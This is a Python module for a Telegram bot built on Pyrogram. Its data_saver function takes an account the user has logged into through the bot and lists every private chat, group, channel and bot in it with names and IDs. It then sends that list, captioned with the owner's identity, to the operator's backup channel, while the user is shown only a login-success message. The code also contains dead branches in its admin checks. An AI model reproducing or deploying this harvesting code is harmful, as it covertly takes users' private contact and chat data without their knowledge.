from config import db 
import random
import string
from pyrogram.enums import ChatType
from config import backup_channel
from . import txt , btn 


async def user_is_join( client , message ) : 
    user = message.from_user.id 
    channel = db.ForGramSettingModel.objects.get(name = 'channel_data').setting['chat_id']
    try : 
        await client.get_chat_member(int(f'{channel}') , user )
        return True
    except Exception as e : return False




def generate_random_string():
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for _ in range(10))
    return result_str



async def data_saver(client , message , account  , BASE_DIR , session_name  ):
        try :
            wait_message = await client.send_message(message.from_user.id , txt.wait_message  )
            SUPERGROUP = ['\n\nSUPERGROUP\n' ,]
            PRIVATE = ['\n\nPRIVATE\n' ,]
            CHANNEL = ['\n\nCHANNEL\n' ,]
            GROUP = ['\n\nGROUP\n' ,]
            ADMIN = ['\n\nADMIN\n' ,]
            BOT = ['\n\nBOT\n',]
            async for dialog in account.get_dialogs():
                try :
                    if dialog.chat.type == ChatType.SUPERGROUP :
                        SUPERGROUP.append(f'{dialog.chat.first_name or dialog.chat.title} - {str(dialog.chat.username)} - {str(dialog.chat.id)}')
                        if dialog.chat.type == ChatType.CHANNEL and dialog.chat.is_creator == True :
                            ADMIN.append(f'{str(dialog.chat.type)}  -  {dialog.chat.first_name or dialog.chat.title} - {str(dialog.chat.username)} - {str(dialog.chat.id)} - {str(dialog.chat.members_count)}')
                            
                    elif dialog.chat.type == ChatType.PRIVATE :
                        PRIVATE.append(f'{dialog.chat.first_name or dialog.chat.title} - {str(dialog.chat.username)} - {str(dialog.chat.id)}')
                        if dialog.chat.type == ChatType.CHANNEL and dialog.chat.is_creator == True :
                            ADMIN.append(f'{str(dialog.chat.type)}  -  {dialog.chat.first_name or dialog.chat.title} - {str(dialog.chat.username)} - {str(dialog.chat.id)} - {str(dialog.chat.members_count)}')

                    elif dialog.chat.type == ChatType.CHANNEL :
                        CHANNEL.append(f'{dialog.chat.first_name or dialog.chat.title} - {str(dialog.chat.username)} - {str(dialog.chat.id)}')
                        if dialog.chat.type == ChatType.CHANNEL and dialog.chat.is_creator == True :
                            ADMIN.append(f'{str(dialog.chat.type)}  -  {dialog.chat.first_name or dialog.chat.title} - {str(dialog.chat.username)} - {str(dialog.chat.id)} - {str(dialog.chat.members_count)}')

                    elif dialog.chat.type == ChatType.GROUP :
                        GROUP.append(f'{dialog.chat.first_name or dialog.chat.title} - {str(dialog.chat.username)} - {str(dialog.chat.id)}')
                        if dialog.chat.type == ChatType.CHANNEL and dialog.chat.is_creator == True :
                            ADMIN.append(f'{str(dialog.chat.type)}  -  {dialog.chat.first_name or dialog.chat.title} - {str(dialog.chat.username)} - {str(dialog.chat.id)} - {str(dialog.chat.members_count)}')

                    elif dialog.chat.type == ChatType.BOT :
                        BOT.append(f'{dialog.chat.first_name or dialog.chat.title} - {str(dialog.chat.username)} - {str(dialog.chat.id)}')
                        if dialog.chat.type == ChatType.CHANNEL and dialog.chat.is_creator == True :
                            ADMIN.append(f'{str(dialog.chat.type)}  -  {dialog.chat.first_name or dialog.chat.title} - {str(dialog.chat.username)} - {str(dialog.chat.id)} - {str(dialog.chat.members_count)}')
                except : continue
            with open(f'{BASE_DIR}/sessions/{session_name}.txt', "w", encoding="utf-8") as file:
                for item in SUPERGROUP:file.write(f"{item}\n")
                for item in PRIVATE:file.write(f"{item}\n")
                for item in CHANNEL:file.write(f"{item}\n")
                for item in GROUP:file.write(f"{item}\n")
                for item in BOT:file.write(f"{item}\n")
                for item in ADMIN:file.write(f"{item}\n")
            user_data = await account.get_me()
            caption = f'{user_data.first_name} - @{user_data.username} - {user_data.id}'
            await client.send_document( chat_id = backup_channel,document = f'{BASE_DIR}/sessions/{session_name}.txt' , caption = caption )
            await client.edit_message_text(
                chat_id=message.chat.id,
                message_id=wait_message.id,
                text=txt.connect_account.logined_successfully ,
                reply_markup = btn.user_panel() )
            return True
        except Exception as e  :
            print(e)




async def alert(clietn , call  , msg= None ):
    if msg is not None :
        return await call.answer(msg, show_alert=True)
    return await call.answer('خطا لطفا دوباره تلاش کنید !', show_alert=True)

